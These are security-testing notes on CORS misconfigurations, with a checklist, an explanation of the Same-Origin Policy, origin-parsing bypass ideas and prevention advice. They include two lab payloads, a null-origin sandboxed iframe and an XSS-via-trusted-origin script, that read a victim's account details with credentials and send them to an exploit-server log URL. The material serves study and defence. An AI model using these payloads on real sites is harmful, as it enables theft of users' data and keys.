# Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a browser security feature that allows a web page from one domain (the "origin") to access resources on another domain. It is an extension of the Same-Origin Policy (SOP) and provides a way to relax its restrictions in a controlled manner.

While CORS adds flexibility, a misconfigured policy can open the door to cross-domain attacks. It is important to note that **CORS is not a protection against Cross-Site Request Forgery (CSRF)**.

## TL;DR Checks

- [ ] Check if arbitrary origins are reflected in the `Access-Control-Allow-Origin` response header
- [ ] Check if `Access-Control-Allow-Credentials` is set to `true`
- [ ] Check if null origin is reflected
- [ ] Try different variations to see if there are any parsing errors
	- [ ] subdomain.target.com
	- [ ] target.com.evil.com
	- [ ] eviltarget.com
- [ ] Check if insecure origins are allowed

## Same-Origin Policy (SOP)

The Same-Origin Policy is a fundamental security mechanism that restricts how a document or script loaded from one **origin** can interact with a resource from another origin.

An "origin" is defined by the combination of the **protocol** (e.g., `http`, `https`), **hostname** (e.g., `www.example.com`), and **port** (e.g., `80`, `443`). If all three match, the origins are the same.

**Example:**
If a page is loaded from `https://www.example.com`, the following table shows which URLs it can and cannot access data from according to the SOP:

| URL | Same Origin? | Reason |
| :--- | :---: | :--- |
| `https://www.example.com/page.html` | Yes | Same protocol, host, and port. |
| `http://www.example.com` | No | Different protocol (HTTP vs. HTTPS). |
| `https://store.example.com` | No | Different hostname (subdomain). |
| `https://www.example.com:8080` | No | Different port. |

>[!tip]
>The SOP generally allows a domain to *send* requests to other domains, but it prevents the requesting domain from *reading* the responses.

## How CORS Works

CORS allows servers to explicitly specify which origins are permitted to access their resources. This is done through HTTP headers.

- **`Access-Control-Allow-Origin`:** This is the most important CORS header. The server includes this header in its response to indicate which origins are allowed. For example:

```http
Access-Control-Allow-Origin: https://www.trusted-site.com
```

A wildcard (`*`) can be used, but this is often insecure as it allows any domain to access the resource.

- **`Access-Control-Allow-Credentials: true`**: Indicates cross-origin requests can include cookies.  

- **Preflight Requests:** For requests that can modify data (e.g., `PUT`, `DELETE`) or use certain headers, the browser first sends a "preflight" request using the `OPTIONS` method. This request checks if the server understands and approves the actual request. If the server responds favorably to the `OPTIONS` request, the browser then sends the actual request.

## Parsing Errors

Be sure to check for errors in `Origin` header parsing.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

Maybe try:

- hackersnormal-website.com
- normal-website.com.evil-user.net

Also check arbitrary subdomains:

- evil.normal-website.com

## Whilelisted NULL origin value

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

Sample payload for `NULL` origin:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0adb00af04759e1980f703df00da0006.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
	location='https://exploit-0a310064045b9e858037027701af008a.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

## Exploiting XSS via CORS Trust Relationships

If the vulnerable site trusts an origin that is vulnerable to XSS, then the attacker might be able to inject JavaScript on the *trusted* site that uses CORS to steal sensitive information from the *trusting* site. 

Example payload when there's an XSS on a trusted site:

```
<script>
document.location="http://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac4000c033411d480bf1bcb01920034.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

## Breaking TLS with Poorly Configured CORS

Be sure to check if CORS accepts insecure `http` sites. 

## Preventing CORS Misconfigurations

- If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header. 
- Do not dynamically reflect arbitrary origins in the ACAO header.
- Avoid whitelisting `null` origins. 
- Avoid using wildcards on internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.

>[!warning]
>CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.
